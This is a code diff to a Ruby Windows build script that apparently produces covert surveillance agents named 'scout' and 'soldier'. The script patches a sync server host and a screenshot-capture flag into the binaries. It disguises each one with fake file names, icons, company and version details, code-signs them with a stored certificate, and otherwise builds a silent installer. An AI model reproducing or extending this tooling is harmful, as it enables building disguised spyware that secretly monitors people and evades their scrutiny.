@@ -45,23 +45,39 @@ class BuildWindows < Build
     params[:config] = nil
     super
 
+    # patch the soldier
+    params[:core] = 'soldier'
+    params[:config] = nil
+    super
+
     marker = nil
+
+    trace :debug, "Patching soldier config"
+
+    patch_file(:file => 'soldier') do |content|
+      begin
+        marker = "Config"
+        #TODO: binary patch the config
+      rescue Exception => e
+        raise "#{marker} marker not found: #{e.message}"
+      end
+    end
 
     trace :debug, "Patching scout for sync and shot"
 
     patch_file(:file => 'scout') do |content|
       begin
-      host = @factory.configs.first.sync_host
-      raise "Sync host not found" unless host
-      marker = "Sync"
-      content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
+        host = @factory.configs.first.sync_host
+        raise "Sync host not found" unless host
+        marker = "Sync"
+        content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
 
-      marker = "Screenshot"
-      # pay attention this flag is inverted. 0000 means screenshot is enabled, 1111 is disabled
-      content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
+        marker = "Screenshot"
+        # pay attention this flag is inverted. 0000 means screenshot is enabled, 1111 is disabled
+        content.binary_patch 'SHOT', @factory.configs.first.screenshot_enabled? ? "\x00\x00\x00\x00" : "\x01\x01\x01\x01"
 
-      marker = "Module name"
-      content.binary_patch 'MODUNAME', module_name('scout')
+        marker = "Module name"
+        content.binary_patch 'MODUNAME', module_name('scout')
       rescue Exception => e
         raise "#{marker} marker not found: #{e.message}"
       end
@@ -161,7 +177,7 @@ class BuildWindows < Build
     melting_mode = :melted if @melted
 
     # change the icon of the exec accordingly to the name
-    customize_scout(@factory.confkey, params['icon']) if @scout
+    customize_scout_and_soldier(@factory.confkey) if @scout or @soldier
 
     trace :debug, "Build: melting mode: #{melting_mode}"
 
@@ -289,6 +305,9 @@ class BuildWindows < Build
     if @scout
       # the scout is already created
       FileUtils.cp path('scout'), path('output')
+    elsif @soldier
+      # the scout is already created
+      FileUtils.cp path('soldier'), path('output')
     else
       # we have to create a silent installer
       cook()
@@ -307,15 +326,6 @@ class BuildWindows < Build
         end
       end
 
-=begin
-      content = File.open(path(silent_file), 'rb') {|f| f.read}
-      offset = content.index("\xef\xbe\xad\xde".force_encoding('ASCII-8BIT'))
-      raise "offset is nil" if offset.nil?
-      output = content.binary_patch_at_offset offset, cooked
-
-      File.open(path('output'), 'wb') {|f| f.write output}
-
-=end
       # delete the cooked output file and overwrite it with the silent output
       FileUtils.rm_rf path('output')
       FileUtils.cp path('silent'), path('output')
@@ -401,26 +411,41 @@ class BuildWindows < Build
     fake_names[seed.ord % fake_names.size] + ' ' + fakever
   end
 
-  def customize_scout(seed, icon)
+  def customize_scout_and_soldier(seed)
 
-    info = scout_name(seed)
-    icon_file = "icons/#{info[:name]}.ico"
+    scout_seed = seed[0]
+    soldier_seed = scout_seed.next
+
+    info_scout = scout_name(scout_seed)
+    icon_scout = "icons/#{info_scout[:name]}.ico"
+    info_soldier = scout_name(soldier_seed)
+    icon_soldier = "icons/#{info_soldier[:name]}.ico"
 
     # binary patch the name of the scout once copied in the startup
     patch_file(:file => 'scout') do |content|
       begin
         # the filename of the final exec
-        content.binary_patch 'SCOUT'*4, info[:name].ljust(20, "\x00")
+        content.binary_patch 'SCOUT'*4, info_scout[:name].ljust(20, "\x00")
       rescue
         raise "Scout name marker not found"
       end
     end
+    patch_file(:file => 'soldier') do |content|
+      begin
+        # the filename of the final exec
+        content.binary_patch 'SCOUT'*4, info_soldier[:name].ljust(20, "\x00")
+      rescue
+        raise "Soldier name marker not found"
+      end
+    end
 
     # change the icon
-    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon_file)}"
+    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon_scout)}"
+    CrossPlatform.exec path('rcedit'), "/I #{path('soldier')} #{path(icon_soldier)}"
 
     # change the infos
-    CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
+    CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info_scout[:version]}\" /s pb \"\" /s desc \"#{info_scout[:desc]}\" /s company \"#{info_scout[:company]}\" /s (c) \"#{info_scout[:copyright]}\" /s product \"#{info_scout[:desc]}\" /pv \"#{info_scout[:version]}\""
+    CrossPlatform.exec path('verpatch'), "/fn /va #{path('soldier')} \"#{info_soldier[:version]}\" /s pb \"\" /s desc \"#{info_soldier[:desc]}\" /s company \"#{info_soldier[:company]}\" /s (c) \"#{info_soldier[:copyright]}\" /s product \"#{info_soldier[:desc]}\" /pv \"#{info_soldier[:version]}\""
 
     # pack the scout
     #CrossPlatform.exec path('packer32'), "#{path('scout')}"
@@ -431,6 +456,7 @@ class BuildWindows < Build
 
     # sign it
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('soldier')}" if to_be_signed?
   end
 
   def customize_icon(file, icon)
